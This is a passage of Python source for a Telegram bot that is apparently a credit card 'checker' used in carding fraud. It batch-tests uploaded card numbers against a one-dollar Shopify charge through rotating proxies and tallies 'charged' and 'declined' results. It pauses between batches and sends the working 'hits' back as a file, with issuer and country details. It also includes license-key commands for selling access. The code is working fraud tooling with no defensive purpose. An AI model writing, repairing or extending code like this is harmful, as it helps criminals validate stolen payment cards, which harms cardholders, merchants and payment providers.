                    f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>\n"
                    f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$\n"
                    f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response}\n"
                    f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                    f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                    f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n"
                    f"[⌬]𝗧𝗶𝗺𝗲 -» {time_taken}\n"
                    f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result.proxy_status}\n"
                    f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by}\n"
                    f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝙎𝙃𝙊𝙋𝙄𝙁𝙔</a>"
                )
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=response_text,
                    parse_mode='HTML'
                )
            else:
                declined += 1
                last_status = f"Declined: {response[:20]}"  # Truncate response for button
        
        keyboard = [
            [InlineKeyboardButton(f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥: {charged}", callback_data='charged')],
            [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌: {declined}", callback_data='declined')],
            [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥💳: {total_cards}", callback_data='total')],
            [InlineKeyboardButton("𝐒𝐭𝐨𝐩🔴", callback_data='stop_batch')],
            [InlineKeyboardButton(f"𝐋𝐚𝐬𝐭: {last_status}", callback_data='response')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            text=(
                f"🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ 𝐂𝐡𝐚𝐫𝐔𝐞𝐝: {charged}\n"
                f"❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                f"🔢 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝: {processed}/{total_cards}\n"
                f"⏱️ 𝐄𝐥𝐚𝐩𝐬𝐞𝐝: {time.time()-start_time:.1f}s\n"
                f"[み] 𝐁𝐨𝐭: @FN_SH_BOT"
            ),
            reply_markup=reply_markup
        )
        
        if i + batch_size < total_cards and not checking_tasks[user_id]['stop']:
            await asyncio.sleep(70)
    
    if not checking_tasks[user_id]['stop']:
        duration = time.time() - start_time
        speed = total_cards / duration if duration > 0 else 0
        success_rate = (charged / total_cards) * 100 if total_cards > 0 else 0
        if charged_cards:
            random_suffix = str(uuid.uuid4())[:8]
            filename = f"fn-hits-{random_suffix}.txt"
            with io.StringIO("\n".join(charged_cards)) as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=io.BytesIO(f.getvalue().encode('utf-8')),
                    filename=filename
                )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=(
                f"[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥: {charged}\n"
                f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {charged + declined}/{total_cards}\n"
                f"[✪] 𝐓𝐨𝐭𝐚𝐥: {total_cards}\n"
                f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
                f"[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
                f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.1f}%\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥</a>"
            ),
            parse_mode='HTML'
        )
    
    if user_id in checking_tasks:
        del checking_tasks[user_id]

async def stop_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id]['stop'] = True
        await query.edit_message_text("Checking Stopped")
    else:
        await query.edit_message_text("No active checking process.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    user_id = update.effective_user.id if update else None
    log_event("ERROR", f"Bot error: {str(error)}", user_id)
    if update:
        await update.message.reply_text("⚠️ An error occurred.")

def main():
    application = Application.builder().token(TOKEN).concurrent_updates(True).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("delkey", delkey))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("addproxy", add_proxy))
    application.add_handler(CommandHandler("delproxy", del_proxy))
    application.add_handler(CommandHandler("listproxies", list_proxies))
    application.add_handler(CommandHandler("reloadproxies", reload_proxies))
    application.add_handler(CommandHandler("sh", lambda update, context: check_access(update, context, single_check)))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CallbackQueryHandler(button, pattern='^(upload_file|cancel_check|help)$'))
    application.add_handler(CallbackQueryHandler(stop_batch, pattern='^stop_batch$'))
    application.add_handler(MessageHandler(filters.Document.ALL, lambda update, context: check_access(update, context, handle_file)))
    application.add_error_handler(error_handler)
    log_event("INFO", "Bot started", None)
    application.run_polling()

if __name__ == '__main__':
    main()